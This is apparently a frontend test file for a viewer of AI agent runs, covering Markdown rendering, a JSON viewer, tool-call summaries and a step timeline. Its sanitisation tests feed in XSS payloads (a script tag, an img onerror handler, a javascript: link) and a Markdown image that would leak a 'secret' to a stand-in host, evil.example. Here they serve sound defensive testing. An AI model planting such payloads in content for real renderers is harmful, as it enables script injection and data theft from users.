import { fireEvent, render, screen, waitFor, within } from "@testing-library/react";
import { afterEach, describe, expect, it, vi } from "vitest";

import { JsonView } from "@/components/json-view";

import docsRun from "../fixtures/docs-run.json";
import { buildTimeline, type ToolTurn } from "../timeline";
import type { RunEvent } from "../types";
import { AgentMessage } from "./agent-message";
import { StepList } from "./step-view";
import { ToolCallGroup, ToolCallRow } from "./tool-calls";
import { describeTool, summarizeTools } from "./tool-describe";

const NOW = Date.parse("2026-10-22T12:00:00Z");

afterEach(() => {
  vi.unstubAllGlobals();
});

describe("AgentMessage", () => {
  it("renders Markdown", () => {
    render(<AgentMessage text={"# Title\n\nSome **bold** text.\n\n- one\n- two"} />);
    expect(screen.getByRole("heading", { name: "Title" })).toBeTruthy();
    expect(screen.getByText("bold").tagName).toBe("STRONG");
    expect(screen.getAllByRole("listitem")).toHaveLength(2);
  });

  it("drops raw HTML and comments, never rendering them", () => {
    const { container } = render(
      <AgentMessage
        text={
          '<!-- module: src -->\nHi <script>alert(1)</script> <img src=x onerror="alert(2)"> there'
        }
      />,
    );
    expect(container.querySelector("script")).toBeNull();
    expect(container.querySelector("img")).toBeNull();
    expect(container.textContent).not.toContain("module: src");
    expect(container.textContent).toContain("Hi");
  });

  it("drops Markdown images, so no remote URL is fetched", () => {
    const { container } = render(<AgentMessage text="![x](https://evil.example/?q=secret)" />);
    expect(container.querySelector("img")).toBeNull();
  });

  it("opens links in a new tab and drops javascript: URLs", () => {
    render(<AgentMessage text="[docs](https://example.com) and [bad](javascript:alert(1))" />);
    const docs = screen.getByRole("link", { name: "docs" });
    expect(docs.getAttribute("target")).toBe("_blank");
    expect(docs.getAttribute("rel")).toBe("noreferrer");
    expect(screen.getByText("bad").getAttribute("href") ?? "").not.toContain("javascript");
  });

  it("shows a caret only while streaming", () => {
    const { rerender } = render(<AgentMessage text="Hello" streaming />);
    expect(screen.getByTestId("agent-message").dataset.streaming).toBe("true");
    rerender(<AgentMessage text="Hello" />);
    expect(screen.getByTestId("agent-message").dataset.streaming).toBeUndefined();
  });
});

describe("JsonView", () => {
  it("opens the first two levels and collapses deeper ones", () => {
    const { container } = render(<JsonView value={{ a: { b: { c: 1 } } }} />);
    const levels = container.querySelectorAll("details");
    expect([...levels].map((d) => d.open)).toEqual([true, true, false]);
  });

  it("copies the pretty-printed JSON", async () => {
    const writeText = vi.fn(() => Promise.resolve());
    vi.stubGlobal("navigator", { clipboard: { writeText } });
    render(<JsonView value={{ path: "src" }} label="arguments" />);
    fireEvent.click(screen.getByRole("button", { name: "Copy arguments" }));
    await waitFor(() => expect(writeText).toHaveBeenCalledWith('{\n  "path": "src"\n}'));
  });
});

function tool(overrides: Partial<ToolTurn> = {}): ToolTurn {
  return {
    kind: "tool",
    key: 1,
    callId: "c1",
    name: "repo.read_file",
    arguments: { path: "src/app.ts" },
    output: '{"text": "x"}',
    status: "completed",
    startedAt: "2026-10-22T12:00:00Z",
    endedAt: "2026-10-22T12:00:02Z",
    ...overrides,
  };
}

describe("describeTool", () => {
  it("says what each repo tool did, and what it is doing", () => {
    expect(describeTool("repo.read_file", { path: "a.ts" })).toMatchObject({
      done: "Read",
      doing: "Reading",
      target: "a.ts",
    });
    expect(describeTool("repo.list_files", { path: "." }).target).toBe("repository root");
    expect(describeTool("repo.search", { pattern: "Item" })).toMatchObject({
      done: "Searched for",
      target: "Item",
    });
    expect(describeTool("repo.commit", { message: "docs: add\n\nbody" }).target).toBe("docs: add");
    expect(describeTool("custom.tool", { q: "x" })).toMatchObject({
      done: "Called custom.tool",
      target: "x",
    });
  });

  it("sums up a group of calls", () => {
    const turns = [
      tool(),
      tool({ key: 2 }),
      tool({ key: 3, name: "repo.list_files", arguments: { path: "src" } }),
      tool({ key: 4, name: "repo.search", arguments: { pattern: "x" } }),
    ];
    expect(summarizeTools(turns)).toBe("Read 2 files, listed 1 folder, ran 1 search");
  });
});

describe("ToolCallRow", () => {
  it("is one line until opened, then shows the arguments and the result", () => {
    render(
      <ul>
        <ToolCallRow turn={tool()} />
      </ul>,
    );
    const trigger = screen.getByRole("button", { name: /Read src\/app\.ts/ });
    expect(trigger.getAttribute("aria-expanded")).toBe("false");
    expect(screen.queryByText("Arguments")).toBeNull();
    fireEvent.click(trigger);
    expect(screen.getByRole("group", { name: "repo.read_file arguments" })).toBeTruthy();
    expect(screen.getByRole("group", { name: "repo.read_file result" }).textContent).toContain(
      '"x"',
    );
  });

  it("marks a failed call and shows its plain-text output", () => {
    render(
      <ul>
        <ToolCallRow turn={tool({ output: "no such file", status: "failed" })} />
      </ul>,
    );
    expect(screen.getByTestId("tool-call").dataset.status).toBe("failed");
    const trigger = screen.getByRole("button", { name: /Read src\/app\.ts failed/ });
    fireEvent.click(trigger);
    expect(screen.getByLabelText("repo.read_file result").textContent).toBe("no such file");
  });

  it("says what a call in flight is doing", () => {
    render(
      <ul>
        <ToolCallRow turn={tool({ status: "running", output: null, endedAt: null })} />
      </ul>,
    );
    expect(screen.getByRole("button").textContent).toContain("Reading");
  });
});

describe("ToolCallGroup", () => {
  const turns = [
    tool(),
    tool({ key: 2, arguments: { path: "src/b.ts" }, endedAt: "2026-10-22T12:00:05Z" }),
    tool({ key: 3, name: "repo.list_files", arguments: { path: "src" }, status: "failed" }),
  ];

  it("collapses consecutive calls into one summary line", () => {
    render(<ToolCallGroup turns={turns} />);
    const summary = screen.getByRole("button", { name: /Read 2 files, listed 1 folder/ });
    expect(summary.textContent).toContain("1 failed");
    expect(summary.textContent).toContain("3 tool calls");
    expect(screen.queryAllByTestId("tool-call")).toHaveLength(0);
    fireEvent.click(summary);
    expect(screen.getAllByTestId("tool-call")).toHaveLength(3);
  });

  it("shows the call in flight while the group runs", () => {
    render(
      <ToolCallGroup
        turns={[
          tool(),
          tool({
            key: 2,
            arguments: { path: "src/b.ts" },
            status: "running",
            output: null,
            endedAt: null,
          }),
        ]}
      />,
    );
    expect(screen.getByRole("button").textContent).toContain("Reading src/b.ts…");
  });
});

describe("StepList on the recorded docs run", () => {
  const timeline = buildTimeline(docsRun as RunEvent[]);

  it("shows one message block per agent turn, nested under the map items", () => {
    render(<StepList steps={timeline.steps} options={{ now: NOW }} />);
    const items = screen.getAllByTestId("map-item");
    expect(items.map((i) => i.querySelector("h4")?.textContent)).toEqual([
      "packages/api",
      "packages/engine",
      "web",
    ]);
    const first = within(items[0]!);
    expect(first.getAllByTestId("agent-message")).toHaveLength(2);
    expect(first.getAllByTestId("tool-group")).toHaveLength(1);
    // A one-step item is not headed twice.
    expect(first.queryByRole("heading", { name: "module-writer" })).toBeNull();
    // 3 writers × 2 turns + 2 review turns.
    expect(screen.getAllByTestId("agent-message")).toHaveLength(8);
    // The page's Markdown heading renders inside the second message.
    const page = within(first.getAllByTestId("agent-message")[1]!);
    expect(page.getByRole("heading", { name: "packages/api" })).toBeTruthy();
  });

  it("shows loop iterations, usage and the gate decision", () => {
    render(<StepList steps={timeline.steps} options={{ now: NOW }} />);
    expect(screen.getAllByTestId("iteration").map((i) => i.firstChild?.textContent)).toEqual([
      "Iteration 1· condition not met",
      "Iteration 2· condition met",
    ]);
    expect(screen.getAllByTestId("usage")[0]?.textContent).toBe("1,200 in · 180 out tokens");
    expect(screen.getByText("Open the docs PR?").parentElement?.textContent).toContain("Approved");
  });

  it("renders extra content for a step", () => {
    render(
      <StepList
        steps={timeline.steps}
        options={{ now: NOW, extra: (s) => (s.id === "approve" ? <p>gate panel</p> : null) }}
      />,
    );
    const gate = screen.getAllByTestId("step").find((s) => s.dataset.nodeId === "approve")!;
    expect(within(gate).getByText("gate panel")).toBeTruthy();
  });
});
